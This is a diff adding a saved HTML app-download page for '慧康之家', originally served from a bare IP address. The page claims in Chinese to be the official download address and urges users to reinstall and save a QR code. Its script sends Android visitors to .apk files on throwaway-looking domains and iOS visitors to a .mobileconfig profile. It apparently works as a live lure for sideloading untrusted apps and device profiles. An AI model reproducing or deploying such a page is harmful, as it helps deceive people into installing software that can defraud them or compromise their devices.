@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)http://45.207.210.43:9004/download.html -->
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>Title</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <script src="./index_files/jquery.js.下载"></script>
+    <script src="./index_files/qrcode.js.下载"></script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            font-size: 16px;
+        }
+
+        .container {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            max-width: 750px;
+            margin: auto;
+            background: linear-gradient(to bottom, #47a1ef, #08c1a0);
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .content {
+            width: 100%;
+            max-width: 600px;
+        }
+
+        .download a {
+            display: inline-flex;
+            width: 150px;
+            padding: 10px 20px;
+            font-size: 18px;
+            border-radius: 15px;
+            color: #fff;
+            background: #08c1a0;
+            border: 1px solid #08c1a0;
+            text-decoration: none;
+            align-items: center;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .download a:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .download a span.text {
+            flex: 1;
+            text-align: center;
+        }
+
+        .download a .icon {
+            width: 25px;
+            margin-right: 15px;
+        }
+
+        .download a .icon img {
+            width: 100%;
+        }
+
+        .download-code {
+            color: #666;
+            width: 160px;
+            overflow: hidden;
+            margin: 30px auto 0;
+            text-align: center;
+        }
+
+        .icon-wrap {
+            background-color: #fff;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 5px solid #fff; /* 添加白色边框 */
+            box-sizing: border-box; /* 边框不影响内部尺寸 */
+        }
+
+        .icon-wrap img {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            border: 1px solid #e5e5e5;
+        }
+
+        .title {
+            font-size: 38px;
+            font-weight: bold;
+            color: #fff;
+            /*margin-top: 20px;*/
+            text-align: center;
+        }
+
+        .min-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .tips-box {
+            font-size: 18px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            color: #fff;
+            text-align: center;
+        }
+
+        .android-download {
+            margin-bottom: 15px;
+        }
+
+        .tip {
+            font-size: 14px;
+            color: #fff;
+            margin-top: 10px;
+        }
+        #icon-src {
+            border: #1f77d5 solid 1px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="content">
+        <div class="title">慧康之家</div>
+        <div class="min-title">APP下载</div>
+        <div class="tips-box">
+            您好，如遇APP登录或访问有问题的，请重新下载安装即可！本下载地址为官方地址，请您保存以下二维码以防丢失！
+        </div>
+        <!--            <div class="icon-wrap">-->
+        <!--                <img id="icon-src" src="logo-icon.png">-->
+        <!--            </div>-->
+
+        <div class="download android-download">
+            <a href="javascript:androidDownload2()">
+                <span class="icon"><img src="./index_files/android-icon1.png"></span>
+                <span class="text">安卓下载一</span>
+            </a>
+        </div>        
+        <div class="download android-download">
+            <a href="javascript:androidDownload()">
+                <span class="icon"><img src="./index_files/android-icon1.png"></span>
+                <span class="text">安卓下载二</span>
+            </a>
+        </div>           
+        <div class="download ios-download">
+            <a href="javascript:iosDownload()">
+                <span class="icon"><img src="./index_files/ios-icon1.png"></span>
+                <span class="text">苹果下载</span>
+            </a>
+        </div>
+        <div class="download-code">
+            <img id="icon-src" src="./index_files/huo.png" style="width:146px;height: 146px ">
+        </div>
+<!--        <div class="text-center tip">保存二维码下载</div>-->
+    </div>
+</div>
+
+
+<script>
+    //生成二维码
+    // jQuery('.download-code').qrcode({
+    //     render: "canvas", //也可以替换为table
+    //     width: 146,
+    //     height: 146,
+    //     mode: 4,
+    //     mSize: 11 * 0.01,
+    //     mPosX: 50 * 0.01,
+    //     mPosY: 50 * 0.01,
+    //     image:$('#img-buffer')[0],//logo图片
+    //     text: location.href,
+    //     background: "#ffffff", //二维码的后景色
+    //     foreground: "#000000", //二维码的前景色
+    // });
+
+    var browser = {
+        versions: function () {
+            var u = navigator.userAgent,
+                app = navigator.appVersion;
+            return { //移动终端浏览器版本信息
+                trident: u.indexOf('Trident') > -1, //IE内核
+                presto: u.indexOf('Presto') > -1, //opera内核
+                webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或uc浏览器
+                iPhone: u.indexOf('iPhone') > -1, //是否为iPhone或者QQHD浏览器
+                iPad: u.indexOf('iPad') > -1, //是否iPad
+                webApp: u.indexOf('Safari') == -1 //是否web应该程序，没有头部与底部
+            };
+        }(),
+        language: (navigator.browserLanguage || navigator.language).toLowerCase()
+    };
+
+    function iosDownload() {
+        var winRef = window.open("", "_self");
+        if (browser.versions.mobile && browser.versions.ios) {
+            winRef.location = 'https://mp-cea83a44-c60e-4320-ad9f-2747a1b932ca.cdn.bspapp.com/20241022/619b47beeb700c6163bf7c3a9d532c1d.mobileconfig';//ios包的地址
+        } else {
+            alert("只支持在ios环境下下载");
+        }
+    }
+
+    function androidDownload() {
+        var winRef = window.open("", "_self");
+        winRef.location = 'http://545454rt678eer.h888.cyou/GTR43443.apk';//android包的地址
+    }
+    function androidDownload2() {
+        var winRef = window.open("", "_self");
+        winRef.location = 'http://9etrt6grt678eer.kh883.world/GTR43443.apk';//android包的地址
+    }    
+</script>
+</body>
+</html>
